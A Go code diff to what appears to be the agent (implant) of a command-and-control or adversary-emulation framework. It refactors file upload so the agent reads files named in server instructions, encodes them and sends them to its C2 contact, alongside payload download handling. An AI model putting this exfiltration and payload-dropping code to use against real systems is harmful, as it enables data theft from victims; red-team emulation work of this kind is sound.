@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"io/ioutil"
 	"os"
 	"path/filepath"
 	"reflect"
@@ -45,7 +46,7 @@ type AgentInterface interface {
 	GetCurrentContactName() string
 	DecodePayload(data []byte, encoding string, decodingOptions map[string]interface{}) []byte
 	EncodeUpload(data []byte, encoding string, encodingOptions map[string]interface{}) []byte
-	UploadFiles(uploadInfo []interface{})
+	UploadFiles(instruction map[string]interface{})
 }
 
 // Implements AgentInterface
@@ -261,28 +262,58 @@ func (a *Agent) RunInstruction(instruction map[string]interface{}, payloads []st
 	}
 
  	// Perform any uploads after sending execution results
- 	if instruction["uploads"] != nil && len(instruction["uploads"].([]interface{})) > 0 {
- 		uploads, ok := instruction["uploads"].([]interface{})
- 		if !ok {
- 			output.VerbosePrint(fmt.Sprintf(
-				"[!] Error: expected []string, but received %T for upload info",
-				instruction["uploads"],
-			))
- 		} else {
- 			a.UploadFiles(uploads)
- 		}
- 	}
+ 	a.UploadFiles(instruction)
 }
 
 // Uploads files according the specified encoding mechanism, if available.
-func (a *Agent) UploadFiles(uploadInfo []interface{}) {
-	for _, path := range uploadInfo {
-		filePath := path.(string)
-		output.VerbosePrint(fmt.Sprintf("Uploading file: %s", filePath))
-		if err := a.beaconContact.UploadFile(a.GetFullProfile(), filePath); err != nil {
-			output.VerbosePrint(fmt.Sprintf("[!] Error uploading file: %v", err.Error()))
+func (a *Agent) UploadFiles(instruction map[string]interface{}) {
+	if instruction["uploads"] != nil && len(instruction["uploads"].([]interface{})) > 0 {
+		uploads, ok := instruction["uploads"].([]interface{})
+		if !ok {
+			output.VerbosePrint(fmt.Sprintf(
+				"[!] Error: expected []interface{}, but received %T for upload info",
+				instruction["uploads"],
+			))
+			return
+		}
+		link_id := instruction["id"].(string)
+
+		// Get payload encoding and options
+		encodingStr, encodingOptions, err := a.getFileEncodingInfo(instruction)
+		if err != nil {
+			output.VerbosePrint(fmt.Sprintf("[-] Error unpacking encoding options: %v", err.Error()))
+			return
+		}
+
+		for _, path := range uploads {
+			filePath := path.(string)
+			if err = a.uploadSingleFile(filePath, encodingStr, encodingOptions, link_id); err != nil {
+				output.VerbosePrint(fmt.Sprintf("[!] Error uploading file %s: %v", filePath, err.Error()))
+			}
 		}
 	}
+}
+
+func (a *Agent) uploadSingleFile(path string, encoding string, encodingOptions map[string]interface{}, link_id string) error {
+	output.VerbosePrint(fmt.Sprintf("Uploading file: %s", path))
+
+	// Get file bytes
+	fetchedBytes, err := ioutil.ReadFile(path)
+	if err != nil {
+		return err
+	}
+
+	// Encode file bytes
+	var uploadBytes []byte
+	if len(encoding) > 0 {
+		uploadBytes = a.EncodeUpload(fetchedBytes, encoding, encodingOptions)
+		if uploadBytes == nil {
+			return errors.New("[!] Failed to encode uploaded file bytes")
+		}
+	} else {
+		uploadBytes = fetchedBytes
+	}
+	return a.beaconContact.UploadFileBytes(a.GetFullProfile(), filepath.Base(path), uploadBytes, link_id)
 }
 
 // Sets the communication channels for the agent according to the specified channel configuration map.
@@ -359,19 +390,12 @@ func (a *Agent) displayLocalReceiverInformation() {
 // mechanism must also be provided in the instruction in order to decode the payload properly.
 func (a *Agent) DownloadInstructionPayloads(instruction map[string]interface{}) []string {
 	var droppedPayloads []string
-	var encodingOptions map[string]interface{}
 	payloads := instruction["payloads"].([]interface{})
 	link_id := instruction["id"].(string)
-
-	// Get payload encoding and options
-	encodingStr := ""
-	if encoding, ok := instruction["file_encoding"]; ok {
-		encodingStr = encoding.(string)
-	}
-	if providedOptions, ok := instruction["encoding_options"]; ok {
-		if err := json.Unmarshal([]byte(providedOptions.(string)), &encodingOptions); err != nil {
-			output.VerbosePrint(fmt.Sprintf("[-] Error unpacking encoding options: %v", err.Error()))
-		}
+	encodingStr, encodingOptions, err := a.getFileEncodingInfo(instruction)
+	if err != nil {
+		output.VerbosePrint(fmt.Sprintf("[-] Error unpacking encoding options: %v", err.Error()))
+		return droppedPayloads
 	}
 
 	// Get payloads
@@ -386,6 +410,20 @@ func (a *Agent) DownloadInstructionPayloads(instruction map[string]interface{}) 
 		droppedPayloads = append(droppedPayloads, location)
 	}
 	return droppedPayloads
+}
+
+// Returns tuple of encoding mechanism, encoding options, and error
+func (a *Agent) getFileEncodingInfo(instruction map[string]interface{}) (string, map[string]interface{}, error) {
+	var encodingOptions map[string]interface{}
+	var err error
+	encodingStr := ""
+	if encoding, ok := instruction["file_encoding"]; ok {
+		encodingStr = encoding.(string)
+	}
+	if providedOptions, ok := instruction["encoding_options"]; ok {
+		err = json.Unmarshal([]byte(providedOptions.(string)), &encodingOptions)
+	}
+	return encodingStr, encodingOptions, err
 }
 
 func (a *Agent) DecodePayload(data []byte, encoding string, decodingOptions map[string]interface{}) []byte {
